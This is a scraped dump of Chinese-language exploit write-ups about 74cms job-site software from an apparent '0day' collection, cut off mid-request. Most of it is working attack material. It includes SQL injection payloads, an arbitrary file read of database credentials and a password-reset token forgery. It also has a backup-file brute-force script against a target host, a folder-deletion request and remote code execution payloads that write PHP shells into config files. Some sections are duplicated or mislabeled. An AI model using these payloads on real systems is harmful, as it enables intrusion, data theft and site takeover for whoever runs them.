url: http://74cms.test/index.php?m=Admin&c=Tpl&a=set&tpl_dir= ', 'a',phpinfo(),' shell:http://74cms.test/Application/Home/Conf/config.php 路径：\\74cms\\upload\\Application\\Home\\Conf\\config.php 0x03 漏洞原理 url: http://74cms.test/index.php?m=Admin&c=Tpl&a=set&tpl_dir= ', 'a',phpinfo(),' 路径：74cms\\upload\\Application\\Admin\\Controller\\TplController.class.php 路径： 74cms\\upload\\Application\\Common\\Controller\\BackendController.class.php 0x04题外话-认真版getshell方法 认真版getshell方法： 实际上想要进行getshell利用组合漏洞是很简单的事情。我的前台日到后台的getshell方法是这样的。 首先利用-任意文件读取漏洞-读取系统中的hash值 然后在通过漏洞-前台sql注入-来插入用户数据-因为我发现他可以支持执行双语句所以可以执行mysql双语句插入一条管理员用户 在通过这个后台getshell漏洞 即可完成一套日穿 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/wecilm 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 10:56:52 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/新版74cms v4.2.126-前台四处sql注入.html":{"url":"0day/74cms/新版74cms v4.2.126-前台四处sql注入.html","title":"74cms v4.2.126-前台四处sql注入","keywords":"","body":"74cms v4.2.126-前台四处sql注入 0x00 前言 厂商：74cms 下载地址：http://www.74cms.com/download/index.html 关于版本： 新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。 注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包) 2， 将下载好的包进行安装 3， 进入后台点击查看如果不是最新版的话，请点击升级！ 4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决 5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php 6， 查找所有$_SERVER['HTTP_HOST'] 改为 http://baidu.com 即可 0x02 概要 这个注入也是挺有趣的，如果不是我有比对源码的习惯的话，可能还找不到这个74cms独有的框架sql注入漏洞 : ) 这里我并不会脱离74cms重新讲一次相关的框架内容，所以读者最好，看看我之前的文章。 ThinkPHP3.2.3框架实现安全数据库操作分析 https://www.yuque.com/pmiaowu/bfgkkh/coglz1 先看完上面的文章，然后在看此文章，会更简单的了解清楚。 0x03 漏洞讲解 非常抱歉，让读者看到前面 3节 不是很有营养的东西。 在前面最开始的时候，我说过我有对比源码，使用手册的情况。 所以这里我们继续在开始之前，我要使用在74cms这个代码里面写个例子，希望可以让你们看懂，因为文化水平不高=-=，写文章感觉和很多前辈差距挺大的。 为了能够更直观，这里开启调试 文件：74cms\\upload\\Application\\Common\\Conf\\config.php 添加多一行 'SHOW_PAGE_TRACE' => true, 然后打开文件：74cms\\upload\\Application\\Home\\Controller\\IndexController.class.php 添加代码： $uid = I('GET.uid'); M('CompanyProfile')->field('companyname,logo')->where(array('uid'=>$uid))->find(); 我感觉到这里可能有人要骂我了。 应该有人会： 你个瓜皮，你家审计可以自己加代码的？ 是的是的，的却不能加。我这样也是想让更多的人能够简单的看懂这个漏洞 那么我们通过这个也能知道一般这种情况，是没得注入的了，而且应为使用了系统函数 I 所以也是没有框架注入这一说。 这里又要重新重复讲解I函数的作用了 在我的眼中I函数就是一个为了解决框架底层设计问题的函数 神奇的I函数 路径:ThinkPHP\\Common\\functions.php 方法名：function I($name,$default='',$filter=null,$datas=null) 这个函数的主要功能为3个 1， 确定数据类型 2， 对数据进行循环取值 3， 调用think_filter 函数进行过滤 think_filter函数分析 例如： 没有使用think_filter 函数时 goods_name[0]=in&goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&goods_name[2]=exp 使用了think_filter函数时 goods_name[0]=in &goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&goods_name[2]=exp 注意：使用了think_filter函数时 in后面是有空格的也就是说返回值是 goods_name[0]=in(空格)&goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&goods_name[2]=exp 而正是这个空格的问题，就可以修复掉可能发生的框架注入问题。 接着我们直接打开文件：74cms\\upload\\ThinkPHP\\Library\\Think\\Db\\Driver.class.php think_filter函数与上图两者对比一下，是否发现多点了东西？ 是的没错了。 74cms 修改了tp底层添加了 3个新方法： match match_mode match_with 也就是说这3个方法我们是可以绕过 I 函数的过滤的 接着查看：parseWhereItem( 方法 使用的是直接字符串拼接的方式入库，故判断此漏洞可利用. 注意了上图我们可控制的点是 $str 而 $str 给双引号包含！！！！！！！ 最开始的时候，记得我说过么，系统默认I 会过滤 “双引号” 而导致此注入不可用，那么就需要找一处不经过I函数或是说不过滤双引号的地方来构造漏洞。 这里我们重新修改一下例子： 打开文件： 74cms\\upload\\Application\\Home\\Controller\\IndexController.class.php 输入url: http://74cms.test/index.php?m=Home&c=index&a=index&uid[0]=match&uid[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) – a 这样的话，这个注入就是可用的了。理解了这个以后，我们也算是挖到了74cms独有的框架漏洞。 接下来整理一下会发生注入的情况 M()->where($test)->xx 那么只要 where中任意参数可控，并不会过滤 双引号即可！ 然后就没什么技术含量了使用ide进行搜索测试即可确定漏洞，经过一顿搜索以后 前端发现一共有四处，也就是说这个框架漏洞，可以利用的地方只有四处。 后端注入，除了挖src，不然我都认为他是没有什么用。所以后端能不能利用我也不知道。我没去看 : ) 0x04 74cms独有框架漏洞第一处 文件：74cms\\upload\\Application\\Home\\Controller\\AjaxPersonalController.class.php 方法：function company_focus($company_id) 是否需登录：需要 登录权限：普通用户即可 为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。 登录后台 注册完成以后登录前台即可 如果不登录的话，会显示这个样子 url:http://74cms.test/index.php?m=&c=AjaxPersonal&a=company_focus http://74cms.test/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) -- a 看源码 打开文件： 74cms\\upload\\Application\\Common\\Model\\PersonalFocusCompanyModel.class.php 方法：add_focus( 0x05 74cms独有框架漏洞第二处 文件：74cms\\upload\\Application\\Home\\Controller\\CompanyServiceController.class.php 方法：order_pay_finish( 是否需登录：需要 登录权限：企业用户即可 看源码 为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。 注册完成以后登录前台即可 url: http://74cms.test/index.php?m=&c=CompanyService&a=order_pay_finish&order_id[0]=match&order_id[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) -- a 如果不登录的话，会显示这个样子 url:http://74cms.test/index.php?m=&c=AjaxPersonal&a=company_focus http://74cms.test/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) -- a 看源码 打开文件： 74cms\\upload\\Application\\Common\\Model\\PersonalFocusCompanyModel.class.php 方法：add_focus( 0x06 74cms独有框架漏洞第二处 文件：74cms\\upload\\Application\\Home\\Controller\\CompanyServiceController.class.php 方法：order_pay_finish( 是否需登录：需要 登录权限：企业用户即可 看源码 为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。 注册完成以后登录前台即可 url: http://74cms.test/index.php?m=&c=CompanyService&a=order_pay_finish&order_id[0]=match&order_id[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) – a 0x07 74cms独有框架漏洞第三处 文件：74cms\\upload\\Application\\Home\\Controller\\MembersController.class.php 方法：register( 是否需登录：不需要 url: http://74cms.test/index.php?m=&c=Members&a=register post: reg_type=2&utype=2&ucenter=bind&unbind_mobile=1 cookie: members_uc_info[reg_type]=1;members_uc_info[utype]=2;members_uc_info[mobile][0]=match;members_uc_info[mobile][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a; headers: Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest 这里我要大概讲一下参数的问题 post: reg_type=2 // 必须为2 为了绕过一个注册判断，为1的话，会直接创建帐户，导致无法利用漏洞 utype=2 // 判断会员类型的也必须为2 为1会直接创建一条数据，导致无法利用漏洞 ucenter=bind // 必须为bind因为要靠他，获取cookie(members_uc_info)并且合并为$data数组进行利用 unbind_mobile=1 // 只要有此字段即可，只是单纯为了满足流程判断的 cookie: members_uc_info[reg_type]=1; // 必须为1 满足流程需要 members_uc_info[utype]=2; // 必须为2 满足流程需要 members_uc_info[mobile][0]=match; // 框架漏洞利用 members_uc_info[mobile][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a; // 这里输入注入语句 headers: // 伪造ajax操作 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest 0x07 74cms独有框架漏洞第四处 文件：74cms\\upload\\Application\\Home\\Controller\\MembersController.class.php 方法：oauth_reg ( 是否需登录：需要 登录权限：普通用户/企业用户都可 url: http://74cms.test/index.php?m=&c=Members&a=oauth_reg post: username = 自己去平台随便注册个账号然后输入那个账号 password = 自己去平台随便注册个账号然后输入那个密码 cookie: members_bind_info[type][0]=match; members_bind_info[type][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a; 看源码 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/nzr6fl 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 10:56:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/新版74cms v4.2.126-任意文件读取漏洞.html":{"url":"0day/74cms/新版74cms v4.2.126-任意文件读取漏洞.html","title":"74cms v4.2.126-任意文件读取漏洞","keywords":"","body":"74cms v4.2.126-任意文件读取漏洞 0x00 前言 厂商：74cms 下载地址：http://www.74cms.com/download/index.html 关于版本： 新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。 注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包) 2， 将下载好的包进行安装 3， 进入后台点击查看如果不是最新版的话，请点击升级！ 4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决 5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php 6， 查找所有$_SERVER['HTTP_HOST'] 改为 http://baidu.com 即可 0x02 任意文件读取漏洞演示 url: http://74cms.test/index.php?m=Home&c=Members&a=register post: reg_type=2&utype=2&org=bind&ucenter=bind cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php;members_bind_info[type]=qq;members_uc_info[password]=123456;members_uc_info[uid]=1;members_uc_info[username]=tttttt; headers: Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest 问题一：漏洞原理？ 我下面会讲 问题二：你如何知道文件名称的？ 我下面会讲 问题三：能不能写个简单的工具，自动利用此漏洞？ 哦，好的，我下面会提供 : ) 0x03 漏洞讲解 打开文件：74cms\\upload\\Application\\Home\\Controller\\MembersController.class.php 函数：_save_avatar($avatar, $uid) 如果不想看图片注释的话，我这里简单的说一下。 812行使用$avatar拼接形成$path 830行使用了$save_avatar+$savePicName; 生成了$filename 838行，使用了copy函数，把$path文件内容复制到了$filename中。 而 $avatar 和 $uid 都是我们刚好可以控制的变量 并且生成的文件名称是$uid+time() 然后md5 一下 拼接 .jpg 这个情况就很舒服了。写个小工具跑一下就好了，小工具会在结尾的时候放出来的。 好了，让我们继续看下去 : ) 我们现在既然已经知道了_save_avatar 函数是有可能造成此漏洞的那么这时，我们就需要去找调用它的地方了。 经过一顿的搜索我们得出了两个地方是调用了他 地方一：register() 方法 会员注册方法 地方二：oauth_reg() 方法 第三方登录注册方法 论此漏洞的利用当然是register() 方法利用起来比较简单 因为 方法二 需要搭建第三方登录，我本地的话。。。还是算了，这里掩饰我使用 方法一 打开文件：74cms\\upload\\Application\\Home\\Controller\\MembersController.class.php 函数：register() 上面的马赛克是因为我写错了几个字，又不想重新写，所以我就把他擦掉了。 皮这一下，我就很开心 这里我们讲解一下如果 post的变量ucenter为bind时，则通过cookie获取数组$uc_user 接着会进行数组合并而members_uc_info的cookie值是可控的，所以$data也是可控的。 这里写着 当 $data[utype] = 1 会进行用户注册，而$data[utype]是我们可以控制的所以我们为2绕过此判断 这里我又跳过了前面一些无关紧要的内容，来到了最后的漏洞触发点。因为真的无关紧要,所以就跳过了 0x04 漏洞利用小工具 https://github.com/ianxtianxt/74cms-upload 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/dr895b 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 10:57:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/新版74cms v4.2.126-通杀sql注入.html":{"url":"0day/74cms/新版74cms v4.2.126-通杀sql注入.html","title":"74cms v4.2.126-通杀sql注入","keywords":"","body":"74cms v4.2.126-通杀sql注入 0x00 前言 厂商：74cms下载地址：http://www.74cms.com/download/index.html 关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。 注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php6， 查找所有$_SERVER['HTTP_HOST'] 改为 http://baidu.com 即可 0x02 数据填充不然没得测试 注：这个漏洞需要在有职位数据的情况下，才能利用。正式环境中，因为都是有数据的所以直接注入即可。不过因为我们是测试环境所以需要我们自己添加一些数据来保证网站的正常运行2 0x02.1注册商家账号方便测试 首先先注册一个商家用户然后发布一条消息，注册商家直接去后台注册最简单了注册完成以后将此商家用户登录前台 登录完毕以后跳转到：http://74cms.test/index.php?m=&c=company&a=com_info设置商家信息然后跳转到：http://74cms.test/index.php?m=&c=Company&a=jobs_add随便发布一条工作消息即可 0x02.2注册普通账号方便测试 一样的前台注册需要短信，我穷，付不起短信费注册完成以后登录前台即可注：一定要登录，因为数据量太少，不登录，过不去验证 0x03 sql漏洞演示 然后输入地址：http://74cms.test/index.php?m=&c=jobs&a=jobs_list&lat=23.176465&range=20&lng=113.35038'注：x，y 不超过 1即可详情页new BMap.Point 搜索出来的值就是 x，y 值 可能上面的内容有人会觉得奇怪，就是这个url实战中你是怎么获得的？其实你可以这样。 这样的话只要点击完以后有数据 你在 lat lng 字段都可以正常的进行注入 Payload: http://74cms.test/index.php?m=&c=jobs&a=jobs_list&lat=23.176465&range=20&lng=113.35038 PI() / 180 - map_x PI() / 180) / 2),2))) * 1000) AS map_range FROM qs_jobs_search j WHERE (extractvalue (1,concat(0x7e,(SELECT USER()), 0x7e))) -- a 剩下的自己注 :) 0x04 漏洞原理 老样子一步步分析吧。先从地址开始分析地址：http://74cms.test/index.php?m=&c=jobs&a=jobs_list典型的mvc结构m 层可以看到为空，我们可以打开目录74cms\\upload\\Application\\Common\\Conf\\config.php 查看DEFAULT_MODULE 参数因此可以确定M = homeC = jobsA = jobs_list 翻译一下的意思就是 Home 目录 下面的jobs 文件里面的jobs_list 方法跟进去 跟进来以后，发现我们的lng 参数并没有在jobs_list 方法，但是在外部的时候的却是这个类。这是因为74cms 使用了 thinkphp 的 tag 也就是标签库驱动 。所以我们在这里并没有看到相关的代码快，因为他是直接嵌了V层中执行也就是我们常说的视图层。想了解这一块的上官网下载thinkphp3.2手册 搜索tag即可获得详细信息 跟进视图层进行查看 找到了视图文件：74cms\\upload\\Application\\Home\\View\\default\\Jobs\\jobs_list.html 根据图中的条件可得知具体目录名为74cms\\upload\\Application\\Common\\qscmstag\\jobs_listTag.class.php 说明我们的猜想是没有错的。 为了不浪费大家的时间，我就尽量选重点讲，避免浪费大家时间!这里我们需要了解一下。 首先是我们可外部控制的值 所以最终我们符合条件的内容都会赋值为$this->params 知道这个接口，我们继续注入点，因为前面的东西有太多和我们的这个注入无关的东西了所以我们忽略掉我上图中还圈出来的第二个圈圈，可以看到 $this->params[lat] 与 $this->params[lng] 赋值并且没有过滤给了$this->field 而大部分的php框架在 field 可控制的情况下大部分都是有注入问题的，所以这里我基本可以通过经验确定，只要带入了进行查询那就是一个注入漏洞。 这里的构造方法知道这些即可，其他的都不是很重要这里我们打印一下，最终处理的内容好了知道这些前置条件以后我们继续。 在执行完这个构造函数以后，还会自动的执行run() 方法 0x05 修复方法 $this->field = \"id,ROUND(6378.138*2*ASIN(SQRT(POW(SIN((\".floatval($this->params['lat']).\"*PI()/180-map_y*PI()/180)/2),2)+COS(\".floatval($this->params['lat']).\"*PI()/180)*COS(map_y*PI()/180)*POW(SIN((\".floatval($this->params['lng']).\"*PI()/180-map_x*PI()/180)/2),2)))*1000) AS map_range\"; 强转为浮点型，防止注入 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/iwgmb2 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 10:57:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/新版74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞.html":{"url":"0day/74cms/新版74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞.html","title":"74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞","keywords":"","body":"74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞 0x00 前言 厂商：74cms 下载地址：http://www.74cms.com/download/index.html 关于版本： 新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。 注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包) 2， 将下载好的包进行安装 3， 进入后台点击查看如果不是最新版的话，请点击升级！ 4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决 5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php 6， 查找所有$_SERVER['HTTP_HOST'] 改为 http://baidu.com 即可 0x02 突突突突突突突 文件： 74cms\\upload\\Application\\Home\\Controller\\ApiController.class.php 方法：members_edit( 从这里看漏洞整体都很简单。没有过多的套路的，有的只是中规中矩。 那么就让我们直接利用试试。 先看看数据库现在的数据 接着让我们来调接口看看 文件： 74cms\\upload\\Application\\Home\\Controller\\ApiController.class.php 方法：check_token( 接口调用失败的原因是因为，上图的析构函数 调用了方法 check_token 进行了token验证 这些都没有问题， $token 也是我们可以操控的。 现在的问题就是C('PWDHASH') 我们现在无法得到。 好在，我们还可以通过组合漏洞的形式来获取。 想要利用此漏洞，我的想法是先通过，任意读取漏洞，先把C('PWDHASH') 的值读取出来，然后在加密验证一下即可 而加密的代码其实我们不需要去看，因为这是全局通用的代码，所以我们正式环境中复制出来加密一下就可以利用了。 思路： 先下载此源码然后本地把此加密函数保存下来即可。（因为没人会没事去改加密函数） 然后在通过 “任意文件读取漏洞” 读取目标站点的C('PWDHASH') 的值，接着本地加密成token 这样漏洞就可以使用了 任意文件读取的小脚本下载 https://github.com/ianxtianxt/74cms_file_read 下载此文件以后 设置成这样，然后执行一下 接着把 PWDHASH 复制出来 我们这里看看加密的代码： 文件：74cms\\upload\\Application\\Common\\Common\\function.php 函数：encrypt( 然后加密一下 这时你就会发现虽然我们密码改了但是不知道用户名怎么办？ 好在我们可以这样利用！ 人家登录是可以用户名，手机号登录的，所以我们就 当然如果你要修改用户名登录的话，也可以，看你自己喜欢了 0x03 利用小工具 为了方便大家，手工做这种事情是很累的，所以还是要写个小工具，可以方便的去利用。 利用工具: https://github.com/ianxtianxt/74cms_file_read 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/rymscc 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 10:57:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/4.2.3任意文件夹删除.html":{"url":"0day/74cms/4.2.3任意文件夹删除.html","title":"74cms v4.2.3 任意文件夹删除","keywords":"","body":"74cms v4.2.3 任意文件删除 一、漏洞简介 二、漏洞影响 三、复现过程 # -*- coding: utf-8 -*- ------------------------------------------------- File Name： 74cms_MysqlBak Description : Author : CoolCat date： 2019/1/5 ------------------------------------------------- Change Activity: 2019/1/5: ------------------------------------------------- \"\"\" __author__ = 'CoolCat' import requests def getBak(time): print(\"[running]:正在查询\" + time + \"是否存在备份\") dir = time + \"_1\" filename = dir + \"_1.sql\" url = target + \"//data/backup/database/\" + dir +\"/\"+ filename session = requests.Session() headers = {\"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0\", \"Connection\": \"close\", \"Accept-Language\": \"en\", \"Accept-Encoding\": \"gzip, deflate\"} cookies = {\"think_language\": \"en\", \"think_template\": \"default\", \"PHPSESSID\": \"6d86a34ec9125b2d08ebbb7630838682\"} response = session.get(url=url, headers=headers, cookies=cookies) if response.status_code == 200: print(url) exit() if __name__ == '__main__': global target target = \"http://www.target.com\" for year in range(2017, 2020): for mouth in range(1, 13): for day in range(1, 31): time = (str(year) + str('%02d' % mouth) + str('%02d' % day)) getBak(time) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-11 14:55:50 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/4.2.3备份文件爆破.html":{"url":"0day/74cms/4.2.3备份文件爆破.html","title":"74cms v4.2.3备份文件爆破","keywords":"","body":"74cms v4.2.3 任意文件删除 一、漏洞简介 二、漏洞影响 三、复现过程 GET /index.php?m=admin&c=database&a=del&name=/../../../../../ HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/index.php?m=admin&c=database&a=restore Connection: close Cookie: think_template=default; PHPSESSID=6d86a34ec9125b2d08ebbb7630838682; think_language=en Upgrade-Insecure-Requests: 1 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-11 14:56:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/1.html":{"url":"0day/74cms/1.html","title":"74cms v5.0.1远程执行代码","keywords":"","body":"74cms v5.0.1远程执行代码 一、漏洞简介 二、漏洞影响 74cms v5.0.1 三、复现过程 漏洞分析 POST /74cms/index.php?m=Admin&c=config&a=edit HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/74cms/index.php?m=Admin&c=Config&a=index Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 391 Connection: close Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&site_domain=127.0.0.1&site_dir=%2F74cms%2F&top_tel=000-00000000&bootom_tel=000-00000000&contact_email=&address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&icp=icp000000000&isclose=0&close_reason=&statistics=&logo_home=&logo_other= c=config&a=edit -> Controller=config&action=edit -> /Application/Admin/Controller/ConfigController.class.php Line 9: I('request.site_domain','','trim') -> trim($site_domain,'/') -> '.'.implode('.',$domain) -> array('domain'=>$domain) -> $this->update_config($config,CONF_PATH.'url.php') public function edit(){ if(IS_POST){ $site_domain = I('request.site_domain','','trim'); $site_domain = trim($site_domain,'/'); $site_dir = I('request.site_dir',C('qscms_site_dir'),'trim'); $site_dir = $site_dir==''?'/':$site_dir; $site_dir = $site_dir=='/'?$site_dir:('/'.trim($site_dir,'/').'/'); $_POST['site_dir'] = $site_dir; if($site_domain && $site_domain != C('qscms_site_domain')){ if($site_domain == C('qscms_wap_domain')){ $this->returnMsg(0,'主域名不能与触屏版域名重复！'); } $str = str_replace('http://','',$site_domain); $str = str_replace('https://','',$str); if(preg_match('/com.cn|net.cn|gov.cn|org.cn$/',$str) === 1){ $domain = array_slice(explode('.', $str), -3, 3); }else{ $domain = array_slice(explode('.', $str), -2, 2); } $domain = '.'.implode('.',$domain); $config['SESSION_OPTIONS'] = array('domain'=>$domain); $config['COOKIE_DOMAIN'] = $domain; $this->update_config($config,CONF_PATH.'url.php'); } /ThinkPHP/Common/functions.php第271行中的I（'request.sitedomain'，''，'trim'）是字符串。request.site_domain-> $ _REQUEST ['site_domain']-> $ REQUEST ['site_domain']是字符串->修剪（$ _REQUEST ['site_domain']） function I($name,$default='',$filter=null,$datas=null) { ... if(strpos($name,'.')) { // 指定参数来源 list($method,$name) = explode('.',$name,2); }else{ // 默认为自动判断 $method = 'param'; } switch(strtolower($method)) { case 'get' : $input =& $_GET; break; case 'post' : $input =& $_POST; break; ... case 'request' : $input =& $_REQUEST; break; ... } if(''==$name) { // 获取全部变量 ... } }elseif(isset($input[$name])) { // 取值操作 $data = $input[$name]; $filters = isset($filter) ? $filter.','.C('DEFAULT_FILTER') : C('DEFAULT_FILTER'); //$filters = isset($filter)?$filter:C('DEFAULT_FILTER'); if($filters) { if(is_string($filters)){ if(0 === strpos($filters,'/')){ if(1 !== preg_match($filters,(string)$data)){ // 支持正则验证 return isset($default) ? $default : null; } }else{ $filters = explode(',',$filters); } }elseif(is_int($filters)){ $filters = array($filters); } if(is_array($filters)){ foreach($filters as $filter){ if(function_exists($filter)) { $data = is_array($data) ? array_map_recursive($filter,$data) : $filter($data); // 参数过滤 }else{ $data = filter_var($data,is_int($filter) ? $filter : filter_id($filter)); if(false === $data) { return isset($default) ? $default : null; } } } } } if(!empty($type)){ ... }else{ // 变量默认值 $data = isset($default)?$default:null; } is_array($data) && array_walk_recursive($data,'think_filter'); return $data; } 返回到/Application/Admin/Controller/ConfigController.class.php第29行：array（'SESSION_OPTIONS'=> array（'domain'=> $ domain），'COOKIE_DOMAIN'=> $ domain） -> update_config（$ config， CONF_PATH.'url.php'） $config['SESSION_OPTIONS'] = array('domain'=>$domain); $config['COOKIE_DOMAIN'] = $domain; $this->update_config($config,CONF_PATH.'url.php'); /Application/Common/Controller/BackendController.class.php第467 行中的update_config（$ config，CONF_PATH.'url.php'）： multimerge（$ config，$ new_config） -> file_put_contents（$ config_file，“ public function update_config($new_config, $config_file = '') { !is_file($config_file) && $config_file = HOME_CONFIG_PATH . 'config.php'; if (is_writable($config_file)) { $config = require $config_file; $config = multimerge($config, $new_config); if($config['SESSION_OPTIONS']){ $config['SESSION_OPTIONS']['path'] = SESSION_PATH; } file_put_contents($config_file, \"multimerge($config, $new_config) in /Application/Common/Common/function.php Line 938: no restricted function multimerge($a, $b) { if (is_array($b) && count($b)) { foreach ($b as $k => $v) { if (is_array($v) && count($v)) { $a[$k] = in_array($k, array('SESSION_OPTIONS')) ? multimerge($a[$k], $v) : $v; } else { $a[$k] = $v; } } } else { $a = $b; } return $a; } CONF_PATH in /ThinkPHP/ThinkPHP.php Line 54: CONF_PATH.'url.php' -> /Application/Common/Conf/url.php defined('COMMON_PATH') or define('COMMON_PATH', APP_PATH.'Common/'); // 应用公共目录 defined('CONF_PATH') or define('CONF_PATH', COMMON_PATH.'Conf/'); define('APP_PATH','./Application/'); var_export(): Quote string with slashes&Convert special characters to HTML entities -> stripslashes(): un-quotes a quoted string -> Convert special characters to HTML entities -> write file file_put_contents($config_file, \"/Application/Home/Conf/url.php: The code after \"return array(...);\" does not work, so payload is site_domain=', {your php code},' 0, 'URL_HTML_SUFFIX' => '.html', 'URL_PATHINFO_DEPR' => '/', 'URL_ROUTER_ON' => true, 'URL_ROUTE_RULES' => array ( '/^jobfair\\/(?!admin)(\\w+)$/' => 'jobfair/index/:1', '/^mall\\/(?!admin)(\\w+)$/' => 'mall/index/:1', ), 'QSCMS_VERSION' => '5.0.1', 'QSCMS_RELEASE' => '2019-03-19 00:00:00', 'SESSION_OPTIONS' => array ( 'domain' => '.0.1', 0 => 18, 1 => '', 'path' => 'D:\\***\\***\\***\\WWW\\74cms\\data\\session', ), 'COOKIE_DOMAIN' => '.0.1', 0 => 18, 1 => '', ); 复现poc -> PD9waHAgcGhwaW5mbygpOz8+ site_domain=', file_put_contents('403.php',base64_decode('PD9waHAgcGhwaW5mbygpOz8+')),' POST /74cms/index.php?m=Admin&c=config&a=edit HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: 